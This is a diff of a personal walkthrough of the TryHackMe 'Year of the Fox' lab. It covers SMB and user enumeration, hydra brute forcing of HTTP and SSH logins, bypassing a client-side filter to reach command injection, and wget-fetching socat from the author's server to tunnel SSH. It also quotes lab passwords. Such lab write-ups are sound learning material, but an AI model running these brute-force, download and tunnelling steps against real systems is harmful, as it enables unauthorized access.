@@ -1,23 +1,23 @@
 ### Year of the Fox Room
 
-[link](https://tryhackme.com/room/yotf)
+[room link](https://tryhackme.com/room/yotf)
 
 ```bash
 $ export ip=10.10.71.216
 ```
 
 
-ok, this machine is classified as hard let us start with nmap and some enumerations.
+ok, this machine is classified as hard so, let us start with nmap and some enumerations.
 
 ```bash
 $ sudo nmap -sS -p- $ip -T3 -vv > nmap/inital
 ```
-1. -sS: do all simple enumerations
+1. -sS: use SYN packages to enumerate
 2. -p-: all ports
 
-i'm using a new text editor now, not sublime anymore...The name of the new is obsidian, is so beatiful dude omg. Don't worry about it just a aleatory notes while the nmap scan isn't done.
+i'm using a new text editor now, not sublime anymore...The name of the new is obsidian, is so beautiful dude omg. Don't worry about it, just aleatory notes while the nmap scan isn't done.
 
-maybe this ip has a http server open so while the nmap isn't done i'll try to find web pages opened.
+maybe this ip has a http server open so, while the nmap isn't done i'll try to find web pages that are opened.
 
 ![](attachments/Pasted%20image%2020231016051220.png)
 
@@ -96,7 +96,7 @@ interesting things here.....username "fox" and share "yotf"
 $ smbclient ////10.10.71.216//ipc$ -N 
 ```
 1. -N: no pass
-it's possible connect but it have nothing inside, i'm not able to put anything into and the share "yotf" needs credentials....
+is possible connect but it have nothing inside, i'm not able to put anything into and the share "yotf" needs credentials....
 
 i'm gonna try gobuster but if i got nothing maybe brute forcing is a good ideia...
 
@@ -123,9 +123,9 @@ BURP I FORGOT TO USE BURP OMG
 
 ![](attachments/Pasted%20image%2020231016071706.png)
 
-and don't have nothing....but i'll use this to brute forcing the http-post
+and didn't have nothing....but i'll use this to brute forcing the http-post
 
-after so many time, i decided to scan one more and try brute force more users because fox user didn't give anything to me.
+after so many time, i decided to scan one more and try brute forcing with more users because fox user didn't give anything to me.
 
 ```bash
 $ python3 /home/akame/tools/enum4linux-ng/enum4linux-ng.py 10.10.71.216 -A -v -R 2000
@@ -206,15 +206,16 @@ then,now i have more information to try another things
 
 	usernames: fox, rascal, nobody
 	shares: $ipc, yotf
-	passwords: rascal:quicksilver
 now i'll try brute forcing again and while it isn't done i'm gonna try access smb server with rascal user or nobody and see with i find something 
 
 ```bash
-$ hydra -l rascal -P /usr/share/wordlists/wordlists/rockyou.txt 10.10.136.99 http-head / -V -F
+$ hydra -l rascal -P /usr/share/wordlists/wordlists/rockyou.txt 10.10.103.133 http-head / -V -F
 ```
 question 1: why http-head in hydra command?
 
-i was questioning myself about this, but maybe it's because the login that this site requests it's the standart, anyway the brute force works with http-post too. But in another login pages like isn't the standart login form from browser you'll need to use http-post and specify the layers and a response which the site sends to you, i think so. 
+i was questioning myself about this, but maybe it's because the login that this site requests it's the standart, anyway the brute force works with http-post too. But in another login pages like isn't the standart login form browser you'll need to use http-post and specify the layers and a response which the site sends to you, i think so. 
+
+if you can see my stars in github, there is a repository that probaly will explain it. The name was "hydra-notes" i think so
 
 THANKS GOD. 
 
@@ -226,19 +227,18 @@ logging with rascal:
 
 let's take a look at this web page...
 
-doesn't have anything in storage but i found two js files,probaly interlinked with this input "Looking for something?". But first let me see what this input do...He searchs for files, i can't type some chars like " * /  % , . ; . " he immediately exclues what i type. But i can type fast the char "/" and get a return:
+didn't have anything in storage but i found two js files,probaly interlinked with this input "Looking for something?". But first let me see what this input do...He searchs for files, i can't type some chars like " * /  % , . ; . " he immediately exclues what i type. But i can type fast the char "/" and get a return:
 
 ![](attachments/Pasted%20image%2020231016083401.png)
 
 but i can't read, maybe can i bypass this "security layer" and inject commands?
-
 
 today is another day and i saw that the password changes every time the machine is turned off, so the password today is another but i already got it :)
 maybe the password will be always in rockyou.txt list so i recommend that you use it 
 
 "gitrdone"
 
-now i gonna deobfuscate the js code to see what the web page is doing 
+now i'm gonna deobfuscate the js code to see what the web page is doing 
 
 i'll leave the file in the directory if you want to read :)
 
@@ -256,7 +256,7 @@ dude wtf this code is so messy and confusing javascript is really a weird langua
 
 ...i'm regretting it lmao and i'm regretting more because i'm 100% sure that i didn't need to deobfuscate it....but it's ok i'm here to learn 
 
-i really tried so much but this code is giving me headache i gonna die if i try understand it better.
+i really tried so much but this code is giving me headache and i gonna die if i try understand it better.
 
 ok,new day again and i've made progress finally.
 
@@ -268,11 +268,11 @@ this input has a two security layer, i don't know the real name but i'll split i
 	server-side
 
 
-the "client-side" was the regex in javascript file that doesn't allow us to enter some specific characters like " / ; ~ \ " etc etc...But it was only javascript, i.e. this "security layer" exists only in my browser. To bypass it i used BurpSuite to intercept the request and i made other requests from here.
+the "client-side" was the regex in javascript file that doesn't allow us to enter some specific characters like " / ; ~ \ " etc etc...But it was only javascript, i.e. this "security layer" exists only in my browser. To bypass it i used BurpSuite to intercept the request and i made other requests from there.
 
 ![](attachments/Pasted%20image%2020231018052107.png)
 
-so, how can you see there, i could type whatever that i wanted and i made a request to server BUT i hadn't an rce yet.
+so, how can you see there, i could type whatever i wanted and i made a request to server BUT i hadn't an rce yet.
 
 now what is come next is the "client-side", look.
 
@@ -309,7 +309,7 @@ ok,i've got the web flag in www directory and now i need to escalate privileges 
 
 after a so much i've got...nothing! wtf nothing working to escalate privilege, i'll tell you what i did.
 
-first i serched in www directory but i found nothing, su didn't work, i hadn't any passwords, no files in contrab, no binaries with suid or capabilities.
+first i searched in www directory but i found nothing, su didn't work, i hadn't any passwords, no files in contrab, no binaries with suid or capabilities.
 
 so i found the creds2.txt in "/var/www/html/files/" or in a somewhere like this.
 
@@ -339,8 +339,48 @@ it's a joke, linpeas found some interesting things like a login that i didn't fi
 ![](attachments/Pasted%20image%2020231018092706.png)
 often i ignore this because i'm dumb. But maybe i can get user fox or rascal with port forwarding thecnique!
 
-i never did it, so it's a new thecnique that i'm gonna learn today! This blog i'll help me with this [juggernaut blog about port forwarding](https://juggernaut-sec.com/port-forwarding-lpe/) . But as you can see in image, there is another ports open running locally(compare with nmap scan), and how are you gonna do this? dunno :D i need to read the blog first wait a minute and i'll explain here too.
+i never did it, so it's a new thecnique that i'm gonna learn today! This blog i'll help me with this [infosec writeup port forwarding](https://infosecwriteups.com/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing-518c0b6a4a0e), and how are you gonna do this? dunno :D i need to read the blog first wait a minute and i'll explain here too.
 
+i'm lying,i'm not gonna explain this here but i'll give to you a link to my notes in notion if you want to read or just read the blog. So when i wake up today i'm thinking about how i could get another using this thecnique if i don't have any passwords....Probaly a brute forcing again i think so
 
-ALEXIS
-10.10.172.172
+after a few hours i understand the port forwarding thecnique and i'm gonna use socat to do this local port forwarding.
+
+so,the commands now:
+
+```bash
+in my machine:
+$ sudo apt update && sudo apt install socat # help us to make the port forwarding but ssh can be used
+$ cd /usr/bin
+$ python3 -m http.server 8080
+
+in rev shell:
+$ wget http://$myip:8080/socat
+$ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22 &
+```
+ok,let me explain all of these. First i downloaded the socat and after this, i've opened a python http server in my binaries folder.
+
+now, in thm machine through rev shell i took the socat binary and execute with this parameters.
+1. tcp-listen:8888 - which port i'll use to do the tunnel 
+2. reuseaddr -  This option indicates that the listening socket should be allowed to reuse the local address. It is often used when you want to restart the socat command without waiting for the OS to release the port.
+3. fork - this is commonly used for handling multiple client connections simultaneously. 
+4. tcp:localhost:22 - this part of the command specifies the destination of the forwarded traffic. It tells socat to forward the incoming connections to a TCP address. In this case, it's forwarding to localhost (127.0.0.1) on port 22, which is the default port for SSH.
+5. & - is used to run this command in background, so i could stay using the terminal if i want
+
+well, let's see if it works!
+
+![](attachments/Pasted%20image%2020231019111634.png)
+
+yeah, worked! So,now i can brute force the ssh.
+
+i'm using the user fox and not rascal because i took a look at the ssh configuration at "/etc/ssh/sshd_config" and...
+![](attachments/Pasted%20image%2020231019123907.png)
+```bash
+in my machine:
+$ sudo nmap -sS $ip 
+$ ssh -p8888 fox@$ip 
+$ hydra -l fox -P /usr/share/wordlists/wordlists/rockyou.txt ssh://$ip:8888 -V -F
+
+```
+
+![](attachments/Pasted%20image%2020231019111541.png)
+
